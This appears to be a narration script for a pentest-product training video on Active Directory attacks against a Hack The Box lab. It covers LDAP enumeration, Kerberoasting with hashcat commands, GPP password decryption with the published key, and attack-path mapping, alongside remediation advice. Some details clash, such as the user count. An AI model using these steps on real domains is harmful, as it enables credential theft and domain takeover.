# VIDEO 49: Active Directory Enumeration
### Domain Mapping, Trust Relationships & AD Attack Paths
**Suggested length:** 16–18 minutes
**License Tier:** Enterprise
**Certification Relevance:** OSCP: Post-Exploitation | CEH: System Hacking

---

## INTRO (0:00 – 1:45)

**[Screen: Huginn splash screen with Section 8 title card "Post-Exploitation and Privilege Escalation"]**

> "Welcome to the final video in Section 8 — Active Directory Enumeration. This is where reconnaissance meets post-exploitation. In Video 13, we covered basic LDAP enumeration from an unauthenticated perspective (see Video 13: LDAP Enumeration). Now we're working from inside the domain — with valid credentials obtained through credential harvesting (see Video 46: Credential Harvesting) — and we can query Active Directory for everything: users, groups, service accounts, trust relationships, Group Policy Preferences, and Kerberoastable accounts. This is the intelligence-gathering phase that enables full domain compromise."

**[Screen: Warning banner — red background with white text: "⚠️ AUTHORIZED TESTING ONLY — AD ENUMERATION WITH DOMAIN CREDENTIALS REQUIRES EXPLICIT AUTHORIZATION"]**

> "Safety and ethics notice. Active Directory enumeration with valid domain credentials gives you access to sensitive organizational data — employee information, group memberships, security policies, and service account details. Even in authorized engagements, handle this data with extreme care. Never exfiltrate AD data outside the test environment, sanitize it from reports where possible, and ensure your scope explicitly covers AD enumeration. Today we're demonstrating against HTB 'Active' — an isolated lab domain controller specifically designed for AD attack demonstrations. No real organizational data is involved."

**[Screen: Huginn Enterprise tier badge — AD Enumeration module highlighted within Post-Exploitation Framework]**

> "AD Enumeration is an Enterprise tier feature that builds on the LDAP enumeration covered in Section 2 (see Video 13: LDAP Enumeration). While LDAP enumeration performs unauthenticated or minimally-authenticated queries, AD Enumeration uses full domain credentials to perform deep domain reconnaissance — Kerberoasting, AS-REP Roasting, BloodHound-style path analysis, and trust relationship mapping. Let's get into it."

---

## SECTION 1: Active Directory Attack Theory (1:45 – 3:30)

**[Screen: Diagram showing AD attack methodology — Enumeration → Kerberoasting → Privilege Escalation → Domain Admin]**

> "Active Directory is the backbone of most enterprise networks. Over 90 percent of Fortune 500 companies use Active Directory for identity management. Understanding AD attack paths is essential for both penetration testers and defenders. The methodology follows a clear path: enumerate the domain to identify high-value targets, identify service accounts vulnerable to Kerberoasting, find misconfigurations in Group Policy, map paths from your current access level to Domain Admin, and execute the shortest path."

**[Screen: AD attack surface diagram — showing Kerberos, LDAP, GPO, NTLM, Trust, ACL attack vectors]**

> "The AD attack surface is vast. Kerberos authentication can be abused through Kerberoasting and AS-REP Roasting to obtain crackable service account hashes. Group Policy Preferences historically stored passwords in reversible encryption. NTLM relay attacks exploit trust relationships between systems. Access Control Lists on AD objects may grant unexpected permissions. And trust relationships between domains can provide paths across organizational boundaries."

**[Screen: Table showing AD enumeration outputs and their offensive value]**

> "Each piece of enumeration data serves a purpose in the attack chain."

| Data Point | Offensive Value |
|-----------|----------------|
| Domain Users | Target list for password spraying, AS-REP Roasting |
| Service Accounts (SPNs) | Kerberoasting targets |
| Group Memberships | Privilege mapping, path finding |
| Domain Admins | Ultimate target identification |
| GPP Passwords | Immediate credential access |
| Trust Relationships | Cross-domain pivot opportunities |
| ACLs on Objects | Permission abuse paths |
| Computer Accounts | Lateral movement target list |

---

## SECTION 2: Lab Setup — HTB Active (3:30 – 5:00)

**[Screen: HTB dashboard — "Active" machine selected (10.10.10.100), Medium difficulty, Windows Server 2008 R2]**

> "Our target is HTB Active — a Medium-rated Windows Active Directory domain controller at 10.10.10.100. Active runs Windows Server 2008 R2 as the domain controller for active.htb. It's the canonical AD enumeration machine on HTB because it features multiple realistic AD vulnerabilities: accessible Group Policy Preferences with encrypted passwords, Kerberoastable service accounts, and standard AD misconfigurations. The machine has LDAP on 389, Kerberos on 88, SMB on 445, DNS on 53, and RPC on 135."

```bash
# Lab Setup — HTB Active
# ═══════════════════════
#
# Platform: Hack The Box
# Machine: Active (10.10.10.100)
# OS: Windows Server 2008 R2
# Domain: active.htb
# Difficulty: Medium
#
# Services:
# ├── LDAP (389)     — AD queries
# ├── Kerberos (88)  — Authentication / Kerberoasting
# ├── SMB (445)      — Share access / GPP
# ├── DNS (53)       — Domain resolution
# └── RPC (135)      — RPC enumeration
#
# Connect via HTB VPN:
# openvpn lab.ovpn
#
# Add to hosts: echo "10.10.10.100 active.htb" >> /etc/hosts
```

**[Screen: Huginn showing established session with domain credentials — SVC_TGS account on active.htb domain]**

> "For this demonstration, we've already obtained domain credentials through GPP password extraction — the user SVC_TGS with a recovered password from Group Policy Preferences. This is a common initial foothold in AD environments where legacy GPP passwords haven't been cleaned up. With valid domain credentials, we can now perform authenticated AD enumeration far beyond what anonymous LDAP queries reveal."

---

## SECTION 3: Domain Enumeration with Huginn (5:00 – 7:30)

**[Screen: Huginn Post-Exploitation → AD Enumeration panel — domain field populated with 'active.htb', credentials populated]**

> "Huginn's ADEnumeration module provides the enumerate_domain function as the starting point. This performs comprehensive domain reconnaissance in a single operation — pulling users, groups, computers, organizational units, and domain policy information through authenticated LDAP queries. Unlike the basic LDAP enumeration in Section 2, this uses our domain credentials for full-access queries."

```bash
# Domain Enumeration
# ══════════════════
# Huginn ADEnumeration.enumerate_domain()
#
# Domain: active.htb
# Credentials: active.htb\SVC_TGS
# Method: Authenticated LDAP
#
# [*] Connecting to LDAP (10.10.10.100:389)...
# [+] Bind successful as SVC_TGS@active.htb
#
# [*] Enumerating domain users...
#     Found: 5 domain users
#     - Administrator
#     - Guest
#     - krbtgt
#     - SVC_TGS
#
# [*] Enumerating domain groups...
#     Found: 12 groups
#     - Domain Admins (Members: Administrator)
#     - Domain Users
#     - Enterprise Admins
#     - Schema Admins
#     - Group Policy Creator Owners
#
# [*] Enumerating computer accounts...
#     Found: 1 computer
#     - DC$ (Domain Controller)
#
# [*] Domain Policy:
#     - Minimum Password Length: 7
#     - Lockout Threshold: 0 (no lockout!)
#     - Password Complexity: Enabled
```

**[Screen: Huginn AD Enumeration results — tabular view showing users, their groups, and account properties]**

> "Several findings jump out immediately. The domain has no account lockout threshold — this means password spraying would face no resistance. The SVC_TGS account name strongly suggests it's a service account with a Service Principal Name — making it a Kerberoasting candidate. And the Administrator account is the sole member of Domain Admins — our ultimate target. Huginn's LDAPDataCollector pulls all of this through standard LDAP search filters against the domain's base DN."

**[Screen: Huginn showing LDAP query details — search base, filter, and attributes requested]**

> "Under the hood, Huginn's ldap_data_collector module constructs targeted LDAP queries. For user enumeration, it searches with filter objectClass=user in the domain base DN, requesting attributes like sAMAccountName, memberOf, servicePrincipalName, userAccountControl, and lastLogon. Each attribute tells us something — servicePrincipalName identifies Kerberoastable accounts, userAccountControl reveals accounts that don't require pre-authentication for AS-REP Roasting, and memberOf shows group memberships."

```bash
# LDAP Query Details
# ──────────────────
# Base DN: DC=active,DC=htb
# Filter: (&(objectClass=user)(objectCategory=person))
# Attributes: sAMAccountName, memberOf, servicePrincipalName,
#             userAccountControl, pwdLastSet, lastLogon
#
# SPN Query (Kerberoasting targets):
# Filter: (&(objectClass=user)(servicePrincipalName=*))
# Result: SVC_TGS — SPN: active/CIFS:445
#
# AS-REP Roastable (no pre-auth required):
# Filter: (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
# Result: 0 accounts (pre-auth required for all)
```

---

## SECTION 4: Kerberoasting Attack (7:30 – 10:30)

**[Screen: Huginn AD Enumeration → Kerberoasting panel — target SPN account identified, attack configuration]**

> "Kerberoasting is the signature Active Directory attack. Here's the concept: any authenticated domain user can request a Kerberos service ticket for any service registered with a Service Principal Name. The service ticket is encrypted with the service account's password hash. If we can crack that hash offline, we get the service account's cleartext password. No privilege escalation required — any domain user can perform this attack."

**[Screen: Diagram showing Kerberoasting flow — User requests TGS → KDC returns ticket encrypted with service hash → Offline cracking → Service account password]**

> "The flow is: we authenticate to the Key Distribution Center with our domain credentials, request a Ticket Granting Service ticket for the target SPN — in this case, SVC_TGS with the SPN active/CIFS:445. The KDC returns a TGS ticket encrypted with SVC_TGS's NTLM hash. We extract that encrypted portion and crack it offline — no network traffic, no failed login attempts, no lockout risk. The KDC sees this as a completely normal service ticket request."

```bash
# Kerberoasting Attack
# ════════════════════
# Huginn ADEnumeration.kerberoasting_attack()
#
# Domain: active.htb
# Target SPN: active/CIFS:445 (SVC_TGS)
# Method: Request TGS ticket, extract encrypted hash
#
# [*] Requesting TGS for SPN: active/CIFS:445...
# [*] Using credentials: SVC_TGS@active.htb
# [+] TGS ticket received
# [*] Extracting encrypted portion (RC4-HMAC)...
#
# Kerberos Hash (hashcat format):
# $krb5tgs$23$*SVC_TGS$ACTIVE.HTB$active/CIFS~445*$a3b7c9d2...
#
# [+] Hash extracted — ready for offline cracking
# [*] Hash type: Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
# [*] Hashcat mode: 13100
# [*] Recommended wordlist: rockyou.txt with rules
```

**[Screen: Huginn showing hash output — Kerberos TGS hash in hashcat format, with copy-to-clipboard button]**

> "Huginn's kerberos_auth module handles the entire TGS request process — constructing the AS-REQ, receiving the AS-REP with TGT, then using that TGT to request the TGS for our target SPN. The extracted hash is formatted for hashcat mode 13100, which is Kerberos 5 TGS-REP etype 23. This hash represents the service account's password encrypted with RC4-HMAC — a weak encryption type that enables practical offline cracking."

```bash
# Offline Hash Cracking
# ─────────────────────
# Export hash to file:
# echo '$krb5tgs$23$*SVC_TGS$ACTIVE.HTB$active/CIFS~445*$a3b...' > tgs_hash.txt
#
# Crack with hashcat:
# hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt
#
# Or with rules for better coverage:
# hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
#
# [*] Status: Cracked
# [+] Password: GPPstillStandingStrong2k18
#
# [!] This is the service account password
# [!] If SVC_TGS has admin privileges → Domain Admin path
```

**[Screen: Huginn credential store updated — SVC_TGS password added, linked to Kerberoasting as source]**

> "Once cracked, the password flows back into Huginn's credential store — linked to its source (Kerberoasting) for reporting purposes. Now the critical question: what privileges does this service account have? If SVC_TGS is a member of Domain Admins or has admin access to the domain controller, we've achieved full domain compromise through a single Kerberoast. On HTB Active, SVC_TGS has sufficient privileges to access the administrator's files — giving us a path to the root flag."

---

## SECTION 5: GPP Password Extraction (10:30 – 12:30)

**[Screen: Huginn AD Enumeration — GPP Password Discovery panel, showing SYSVOL share contents]**

> "Group Policy Preferences is a legacy vulnerability that still appears in enterprise environments today. Before Microsoft patched it in MS14-025, administrators could set local account passwords through Group Policy Preferences — and those passwords were stored in XML files on the SYSVOL share, encrypted with a publicly known AES key. Any domain user can read SYSVOL, which means any domain user can decrypt those passwords."

**[Screen: Huginn showing SMB access to SYSVOL share — navigating to Policies → Group Policy objects → Preferences]**

> "The attack path is simple. Connect to the target's SYSVOL share with any valid domain credentials. Navigate through the Policies directory structure, looking for XML files containing 'cpassword' attributes. These files live in various locations — Groups.xml for local user settings, Services.xml for service configurations, Scheduledtasks.xml for scheduled task credentials, and Datasources.xml for mapped drive credentials."

```bash
# GPP Password Discovery
# ══════════════════════
# Target Share: \\10.10.10.100\Replication (or SYSVOL)
#
# [*] Connecting to SMB share with domain credentials...
# [+] Connected to \\10.10.10.100\Replication
#
# [*] Searching for Groups.xml, Services.xml, ScheduledTasks.xml...
# [+] Found: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
#
# Groups.xml contents:
# <Groups>
#   <User clsid="{...}" name="active.htb\SVC_TGS" image="2"
#         changed="2018-07-18" uid="{...}">
#     <Properties action="U" newName="" fullName=""
#                 description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+..."
#                 userName="active.htb\SVC_TGS"/>
#   </User>
# </Groups>
```

**[Screen: Huginn GPP decryption — showing the cpassword value and the decrypted cleartext]**

> "The cpassword value is AES-256 encrypted, but Microsoft published the encryption key in their MSDN documentation. Decryption is deterministic — every tool produces the same result. Huginn automatically identifies cpassword attributes and decrypts them. The decrypted password is GPPstillStandingStrong2k18 — which confirms the credentials we used for authentication. In a real engagement, GPP passwords often reveal local administrator passwords or service account credentials that haven't been changed since the GPP was created."

```bash
# GPP Password Decryption
# ───────────────────────
# cpassword: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+...
# AES Key: 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
# (Published by Microsoft — same for ALL GPP passwords)
#
# [+] Decrypted password: GPPstillStandingStrong2k18
# [+] Account: active.htb\SVC_TGS
#
# [*] GPP vulnerability: MS14-025 (patched 2014)
# [*] Impact: Any domain user can decrypt these passwords
# [*] Remediation: Delete old GPP XML files from SYSVOL
```

**[Screen: Huginn findings panel — GPP vulnerability automatically created as Critical finding with CVSS score]**

> "Huginn automatically creates a finding for this — GPP password exposure is rated Critical because any authenticated user can access it, decryption is trivial, and the exposed credentials often grant elevated access. Your report should recommend immediate deletion of all GPP XML files containing cpassword attributes and rotation of any passwords that were stored there."

---

## SECTION 6: BloodHound-Style Path Analysis (12:30 – 14:45)

**[Screen: Huginn AD Enumeration → Attack Path Analysis panel — graph visualization showing domain objects and relationships]**

> "BloodHound-style analysis maps the relationships between AD objects to find the shortest path from your current access to Domain Admin. Huginn's bloodhound_analysis function collects the same data that SharpHound would — users, groups, sessions, ACLs, and trust relationships — and identifies privilege escalation paths. The key insight is that AD permissions are often misconfigured, creating unintended paths between low-privilege accounts and domain admin access."

```bash
# BloodHound-Style Analysis
# ═════════════════════════
# Huginn ADEnumeration.bloodhound_analysis()
#
# [*] Collecting domain objects...
#     Users: 5
#     Groups: 12
#     Computers: 1
#     OUs: 3
#
# [*] Collecting group memberships...
#     Domain Admins → Administrator
#     Domain Users → SVC_TGS, Guest
#
# [*] Collecting ACLs on critical objects...
#     [!] SVC_TGS has GenericAll on Administrator? Checking...
#
# [*] Collecting session data...
#     Active sessions on DC: Administrator
#
# [*] Analyzing attack paths...
# [+] Path found: SVC_TGS → Kerberoast → Administrator hash → Domain Admin
# [+] Path length: 2 hops
# [*] Confidence: High (SPN registered, RC4 enabled)
```

**[Screen: Huginn path visualization — graph showing SVC_TGS → (Kerberoast) → Administrator with confidence scores]**

> "The path analysis reveals that from SVC_TGS, we can Kerberoast the Administrator account if it has an SPN registered, or we can use the already-cracked SVC_TGS credentials to access administrative shares. In more complex environments, you'd see multi-hop paths — User A has GenericWrite on Group B, which has permissions on Computer C, where Domain Admin has an active session. Those chained relationships are where BloodHound analysis shines."

**[Screen: Huginn showing trust relationship mapping — forest trusts, domain trusts, trust directions]**

> "Trust relationship mapping identifies paths between domains. A two-way trust means credentials in Domain A can access resources in Domain B. In environments with multiple domains or forests, trust abuse can provide access that individual domain compromises cannot. Huginn queries the trusted domain objects in AD and maps the trust type, direction, and any SID filtering that might restrict cross-domain access."

```bash
# Trust Relationship Mapping
# ──────────────────────────
# [*] Querying domain trusts...
#
# Domain: active.htb
# Forest: active.htb
# Trust Relationships: 0 (single-domain environment)
#
# In multi-domain environments, you'd see:
# ┌──────────────┬───────────┬───────────┬──────────────────┐
# │ Trusted Domain│ Direction │ Type      │ SID Filtering    │
# ├──────────────┼───────────┼───────────┼──────────────────┤
# │ child.active │ Bidirectional│ Parent-Child│ Disabled       │
# │ partner.com  │ Outbound  │ External  │ Enabled          │
# └──────────────┴───────────┴───────────┴──────────────────┘
#
# [*] SID Filtering disabled = SID History attack possible
# [*] Bidirectional trust = Access from either domain
```

---

## SECTION 7: Reporting and Remediation Guidance (14:45 – 16:30)

**[Screen: Huginn Findings panel — AD enumeration findings listed with severity ratings and remediation steps]**

> "Every AD enumeration finding feeds into your engagement report. Huginn categorizes AD findings by severity: GPP passwords are Critical because they provide immediate credential access. Kerberoastable accounts with weak passwords are High because they require offline cracking but have high success rates. Missing account lockout policies are Medium because they enable password spraying. Each finding includes specific remediation guidance."

```bash
# AD Enumeration Findings Summary
# ════════════════════════════════
#
# ┌────────┬───────────────────────────────┬──────────┬─────────────────────────────────┐
# │ Severity│ Finding                      │ CVSS     │ Remediation                     │
# ├────────┼───────────────────────────────┼──────────┼─────────────────────────────────┤
# │ CRITICAL│ GPP Passwords in SYSVOL      │ 9.8      │ Delete GPP XML, rotate creds    │
# │ HIGH   │ Kerberoastable SVC_TGS       │ 8.1      │ Use gMSA, rotate to 25+ char    │
# │ MEDIUM │ No Account Lockout Policy    │ 6.5      │ Set threshold to 5 attempts     │
# │ LOW    │ RC4 Kerberos Encryption      │ 4.3      │ Enforce AES-only Kerberos       │
# │ INFO   │ Domain functional level 2008 │ —        │ Upgrade to 2016+ for features   │
# └────────┴───────────────────────────────┴──────────┴─────────────────────────────────┘
```

**[Screen: Huginn report export — AD attack path diagram included in executive summary format]**

> "The executive summary for AD findings tells the business story: 'A single compromised service account with a weak password, discoverable through publicly readable Group Policy files, provided a direct path to full domain administrative control. Estimated time from initial access to domain compromise: under 30 minutes.' That narrative, backed by your documented attack path, communicates risk effectively to decision makers."

**[Screen: Huginn AD remediation checklist — generated automatically from findings]**

> "Huginn generates a prioritized remediation checklist from your findings. Priority one: delete all GPP XML files containing cpassword attributes and rotate every password that was stored there. Priority two: convert service accounts to Group Managed Service Accounts with 120-character automatically-rotated passwords — these can't be Kerberoasted effectively. Priority three: implement account lockout policies. Priority four: enforce AES Kerberos encryption to eliminate RC4 hash extraction. Each item links to specific Microsoft documentation for implementation."

```bash
# Remediation Priority List
# ─────────────────────────
#
# P1 (Immediate):
# ☐ Delete all GPP XML files from SYSVOL
# ☐ Rotate SVC_TGS password (GPP-exposed)
# ☐ Rotate Administrator password (if Kerberoasted)
#
# P2 (Short-term — 30 days):
# ☐ Convert SVC_TGS to Group Managed Service Account (gMSA)
# ☐ Audit all SPNs — remove unnecessary registrations
# ☐ Implement account lockout (5 attempts / 30 min)
#
# P3 (Medium-term — 90 days):
# ☐ Enforce AES Kerberos (disable RC4_HMAC_MD5)
# ☐ Enable Protected Users group for privileged accounts
# ☐ Deploy LAPS for local administrator passwords
# ☐ Upgrade domain functional level to 2016+
```

---

## OUTRO (16:30 – end)

**[Screen: Summary card showing all AD enumeration techniques — Domain Enumeration, Kerberoasting, GPP Passwords, AS-REP Roasting, BloodHound Analysis, Trust Mapping]**

> "That wraps up Active Directory Enumeration and the entire Section 8 — Post-Exploitation and Privilege Escalation. We covered domain enumeration with authenticated LDAP queries, Kerberoasting to extract service account hashes for offline cracking, Group Policy Preferences password extraction, BloodHound-style attack path analysis, and trust relationship mapping for cross-domain opportunities. Combined with session management, credential harvesting, persistence, and lateral movement from the previous four videos, you now have a complete post-exploitation methodology."

**[Screen: Section 8 completion summary — Videos 45-49 listed with key takeaways]**

> "Section 8 recap: Video 45 taught us session management for maintaining multiple shells. Video 46 covered credential harvesting — SAM dumps, LSA secrets, and hash extraction. Video 47 demonstrated persistence through registry keys, scheduled tasks, services, and crontab. Video 48 showed lateral movement with PsExec, WMI, SMB, and SSH. And today, Video 49, completed the picture with AD enumeration and attack path identification. Together, these five videos cover the full 'Elevate' phase of the attack chain."

**[Screen: Ethics reminder — "Authorized Access Only. Handle AD Data With Care. Report Responsibly."]**

> "Final ethics reminder for Section 8: every technique in these five videos carries serious legal implications if used without authorization. Handle enumerated AD data as sensitive — don't store it on personal devices or include raw dumps in reports. Document everything, clean everything, and report responsibly. In Section 9, we'll take all our findings and produce professional penetration testing reports — findings management, report generation, executive summaries, and compliance mapping (see Video 50: Findings Management)."

**[Screen: Huginn logo with "Enterprise Tier — Post-Exploitation Framework" and certification badges: OSCP Post-Exploitation, CEH System Hacking]**

> "This is an Enterprise tier feature. AD enumeration maps to the OSCP Post-Exploitation domain and CEH System Hacking domain. For practice, HTB Active is the perfect starting point for AD enumeration. Progress to HTB Forest for AS-REP Roasting, HTB Cascade for deeper LDAP enumeration, and HTB Monteverde for Azure AD scenarios. The Offensive Security 'Active Directory' Pro Lab provides a full multi-domain environment for comprehensive practice. See you in Section 9."

---

## License Tier Reference

| Feature | Required Tier |
|---------|---------------|
| Authenticated Domain Enumeration | Enterprise |
| Kerberoasting Attack | Enterprise |
| AS-REP Roasting | Enterprise |
| GPP Password Extraction | Enterprise |
| BloodHound-Style Path Analysis | Enterprise |
| Trust Relationship Mapping | Enterprise |
| AD Finding Generation | Enterprise |
| Remediation Checklist | Enterprise |
